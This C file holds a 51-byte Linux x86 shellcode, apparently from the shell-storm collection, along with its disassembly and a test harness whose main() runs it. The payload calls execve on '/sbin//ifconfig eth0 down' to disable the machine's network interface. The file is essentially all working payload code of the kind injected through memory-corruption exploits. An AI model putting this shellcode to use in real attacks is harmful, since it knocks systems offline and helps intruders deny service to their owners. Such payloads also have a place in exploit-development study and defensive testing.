/*  Linux x86 - ifconfig eth0 down - 51 bytes
 *  Jonathan Salwan js.rac.projet[*AT]gmail.com
 *  Web: http://www.shell-storm.rg
 *
 *
 *
 * Disassembly of section .text:
 *
 * 08048060 <_start>:
 * 8048060:       6a 0b                   push   $0xb
 * 8048062:       58                      pop    %eax
 * 8048063:       99                      cltd
 * 8048064:       52                      push   %edx
 * 8048065:       68 64 6f 77 6e          push   $0x6e776f64
 * 804806a:       89 e6                   mov    %esp,%esi
 * 804806c:       52                      push   %edx
 * 804806d:       68 65 74 68 30          push   $0x30687465
 * 8048072:       89 e1                   mov    %esp,%ecx
 * 8048074:       52                      push   %edx
 * 8048075:       68 6e 66 69 67          push   $0x6769666e
 * 804807a:       68 69 66 63 6f          push   $0x6f636669
 * 804807f:       68 69 6e 2f 2f          push   $0x2f2f6e69
 * 8048084:       68 2f 2f 73 62          push   $0x62732f2f
 * 8048089:       89 e3                   mov    %esp,%ebx
 * 804808b:       52                      push   %edx
 * 804808c:       56                      push   %esi
 * 804808d:       51                      push   %ecx
 * 804808e:       53                      push   %ebx
 * 804808f:       89 e1                   mov    %esp,%ecx
 * 8048091:       cd 80                   int    $0x80
 *
 */

main()
{
char shellcode[] = 
			"\x6a\x0b"
			"\x58"
			"\x99"
			"\x52"
			"\x68\x64\x6f\x77\x6e"
			"\x89\xe6"
			"\x52"
			"\x68\x65\x74\x68\x30"
			"\x89\xe1"
			"\x52"
			"\x68\x6e\x66\x69\x67"
			"\x68\x69\x66\x63\x6f"
			"\x68\x69\x6e\x2f\x2f"
			"\x68\x2f\x2f\x73\x62"
			"\x89\xe3"
			"\x52"
			"\x56"
			"\x51"
			"\x53"
			"\x89\xe1"
			"\xcd\x80";

       	printf("Length: %d\n",strlen(shellcode));
	(*(void(*)()) shellcode)();       
}